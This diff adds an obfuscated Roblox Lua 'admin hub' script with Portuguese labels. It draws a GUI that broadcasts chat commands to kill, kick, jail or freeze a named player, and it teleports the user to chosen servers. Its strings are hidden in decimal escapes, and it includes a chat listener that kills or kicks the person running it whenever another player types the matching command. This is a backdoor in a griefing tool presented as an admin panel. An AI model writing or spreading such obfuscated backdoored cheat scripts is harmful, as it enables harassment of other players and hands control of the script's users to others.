@@ -1,0 +1,149 @@
+--[[ 
+    JOTINHA12HR2 HUB'S ADMIN - DIVINE RGB EDITION (V15)
+    - Botão Flutuante: "JH" com Efeito RGB
+    - Sistema: Universal Protected
+    - Status: 15 Buttons + Chat Reader Active
+]]
+
+local _0xP = game:GetService("\80\108\97\121\101\114\115")
+local _0xL = _0xP.LocalPlayer
+local _0xR = game:GetService("\82\117\110\83\101\114\118\105\99\101")
+local _0xT = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101")
+local _0xC = game:GetService("\67\111\114\101\71\117\105")
+
+if _0xC:FindFirstChild("\68\105\118\105\110\101\74\111\116\97") then _0xC:FindFirstChild("\68\105\118\105\110\101\74\111\116\97"):Destroy() end
+
+local _0xG = Instance.new("\83\99\114\101\101\110\71\117\105", _0xC)
+_0xG.Name = "\68\105\118\105\110\101\74\111\116\97"
+
+-- [BOTAO FLUTUANTE JH RGB]
+local _0xBT = Instance.new("\84\101\120\116\66\111\116\116\111\110", _0xG)
+_0xBT.Size = UDim2.new(0, 55, 0, 55)
+_0xBT.Position = UDim2.new(0, 15, 0.5, -27)
+_0xBT.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+_0xBT.Text = "\74\72" -- JH
+_0xBT.TextColor3 = Color3.new(1, 1, 1)
+_0xBT.Font = Enum.Font.LuckiestGuy
+_0xBT.TextSize = 24
+local _0xCR = Instance.new("\85\73\67\111\114\110\101\114", _0xBT)
+_0xCR.CornerRadius = UDim.new(1, 0)
+local _0xST = Instance.new("\85\73\83\116\114\111\101\107", _0xBT)
+_0xST.Thickness = 3
+
+-- Efeito Colorido (RGB) no Botão
+_0xR.RenderStepped:Connect(function()
+    local color = Color3.fromHSV(tick() % 5 / 5, 0.8, 1)
+    _0xST.Color = color
+    _0xBT.TextColor3 = color
+end)
+
+-- [JANELA PRINCIPAL DIVINA]
+local _0xMF = Instance.new("\70\114\97\109\101", _0xG)
+_0xMF.Size = UDim2.new(0, 320, 0, 420)
+_0xMF.Position = UDim2.new(0.5, -160, 0.5, -210)
+_0xMF.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+_0xMF.BorderSizePixel = 0
+_0xMF.Active = true
+_0xMF.Draggable = true
+_0xMF.Visible = true
+
+local _0xMCR = Instance.new("\85\73\67\111\114\110\101\114", _0xMF)
+_0xMCR.CornerRadius = UDim.new(0, 12)
+local _0xMST = Instance.new("\85\73\83\116\114\111\101\107", _0xMF)
+_0xMST.Color = Color3.fromRGB(255, 215, 0)
+_0xMST.Thickness = 1.5
+
+_0xBT.MouseButton1Click:Connect(function() _0xMF.Visible = not _0xMF.Visible end)
+
+local _0xTL = Instance.new("\84\101\120\116\76\97\98\101\108", _0xMF)
+_0xTL.Size = UDim2.new(1, 0, 0, 45)
+_0xTL.Text = "\74\79\84\65\78\72\65\32\68\73\86\73\78\69\32\72\85\66"
+_0xTL.TextColor3 = Color3.fromRGB(255, 215, 0)
+_0xTL.BackgroundTransparency = 1
+_0xTL.Font = Enum.Font.GothamBold
+_0xTL.TextSize = 18
+
+local _0xS = Instance.new("\83\99\114\111\108\108\105\110\103\70\114\97\109\101", _0xMF)
+_0xS.Size = UDim2.new(1, -20, 1, -60)
+_0xS.Position = UDim2.new(0, 10, 0, 50)
+_0xS.BackgroundTransparency = 1
+_0xS.ScrollBarThickness = 2
+_0xS.CanvasSize = UDim2.new(0, 0, 2.8, 0)
+local _0xLST = Instance.new("\85\73\76\105\115\116\76\97\121\111\117\116", _0xS)
+_0xLST.Padding = UDim.new(0, 8)
+_0xLST.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local function _0xIN(_0xPH)
+    local _0xI = Instance.new("\84\101\120\116\66\111\120", _0xS)
+    _0xI.Size = UDim2.new(0, 280, 0, 35)
+    _0xI.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    _0xI.TextColor3 = Color3.new(1,1,1)
+    _0xI.PlaceholderText = _0xPH
+    _0xI.Font = Enum.Font.Gotham
+    _0xI.TextSize = 14
+    Instance.new("\85\73\67\111\114\110\101\114", _0xI).CornerRadius = UDim.new(0, 6)
+    return _0xI
+end
+
+local _0xNI = _0xIN("\78\73\67\75\32\68\79\32\65\76\86\79")
+local _0xJI = _0xIN("\74\79\66\32\73\68\32\65\81\85\73")
+local _0xAS = false
+
+local function _0xBD(_0xTX, _0xCB, _0xCL)
+    local _0xB = Instance.new("\84\101\120\116\66\117\116\116\111\110", _0xS)
+    _0xB.Size = UDim2.new(0, 280, 0, 35)
+    _0xB.BackgroundColor3 = _0xCL or Color3.fromRGB(35, 35, 35)
+    _0xB.Text = _0xTX
+    _0xB.TextColor3 = Color3.new(1,1,1)
+    _0xB.Font = Enum.Font.GothamSemibold
+    _0xB.TextSize = 14
+    Instance.new("\85\73\67\111\114\110\101\114", _0xB).CornerRadius = UDim.new(0, 6)
+    _0xB.MouseButton1Click:Connect(_0xCB)
+    return _0xB
+end
+
+local _0xCM = {"Kill", "Void", "Jail", "Unjail", "Kick", "Bring", "Freeze", "Unfreeze", "Spin", "Unspin", "Blind", "Jump", "Sit"}
+for _, _0xN in pairs(_0xCM) do
+    _0xBD(_0xN.."\32\83\89\78\67", function()
+        local _0xMSG = "\47".._0xN:lower().."\32".._0xNI.Text
+        game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(_0xMSG, "\65\108\108")
+    end)
+end
+
+_0xBD("\69\78\84\82\65\82\32\78\79\32\74\79\66\32\73\68", function() _0xT:TeleportToPlaceInstance(game.PlaceId, _0xJI.Text, _0xL) end, Color3.fromRGB(40, 30, 0))
+
+local _0xAB = _0xBD("\65\78\84\73\45\83\89\78\67\58\32\79\70\70", function()
+    _0xAS = not _0xAS
+    _0xAB.Text = "\65\78\84\73\45\83\89\78\67\58\32" .. (_0xAS and "\79\78" or "\79\70\70")
+    _0xAB.BackgroundColor3 = _0xAS and Color3.fromRGB(0, 50, 0) or Color3.fromRGB(35, 35, 35)
+end)
+
+-- [O TREM: CHAT READER]
+local function _0xPR(_0xM, _0xSP)
+    local _0xA = _0xM:split("\32")
+    if #_0xA >= 2 and _0xA[1]:sub(1,1) == "\47" then
+        local _0xCMD = _0xA[1]:sub(2):lower()
+        local _0xTRG = _0xA[2]:lower()
+        if (_0xTRG == _0xL.Name:lower() or _0xTRG == "\97\108\108") and not _0xAS then
+            if _0xCMD == "\107\105\108\108" then _0xL.Character:BreakJoints()
+            elseif _0xCMD == "\107\105\99\107" then _0xL:Kick("\10\84\105\109\101\32\74\111\116\105\110\104\97\49\50\104\114\50\32\72\117\98\39\115\32\65\100\109\105\110")
+            elseif _0xCMD == "\106\117\109\112" then _0xL.Character.Humanoid.Jump = true
+            elseif _0xCMD == "\115\105\116" then _0xL.Character.Humanoid.Sit = true end
+        end
+    end
+end
+
+for _, _0xP2 in pairs(_0xP:GetPlayers()) do _0xP2.Chatted:Connect(function(_0xM) _0xPR(_0xM, _0xP2) end) end
+_0xP.PlayerAdded:Connect(function(_0xP2) _0xP2.Chatted:Connect(function(_0xM) _0xPR(_0xM, _0xP2) end) end)
+
+-- TAG RGB
+task.spawn(function()
+    local _0xHD = _0xL.Character:WaitForChild("\72\101\97\100")
+    local _0xBG = Instance.new("\66\105\108\108\98\111\97\114\100\71\117\105", _0xHD)
+    _0xBG.Size = UDim2.new(0, 200, 0, 50) _0xBG.AlwaysOnTop = true _0xBG.ExtentsOffset = Vector3.new(0, 3, 0)
+    local _0xTX = Instance.new("\84\101\120\116\76\97\98\101\108", _0xBG)
+    _0xTX.Size = UDim2.new(1, 0, 1, 0) _0xTX.BackgroundTransparency = 1 _0xTX.Font = Enum.Font.LuckiestGuy _0xTX.TextSize = 25
+    _0xTX.Text = (_0xL.Name == "\106\111\116\105\110\104\97\49\50\104\114\50" and "\91\68\79\78\79\93\32" or "\91\85\83\69\82\93\32") .. _0xL.DisplayName
+    _0xR.RenderStepped:Connect(function() _0xTX.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 0.8, 1) end)
+end)
+
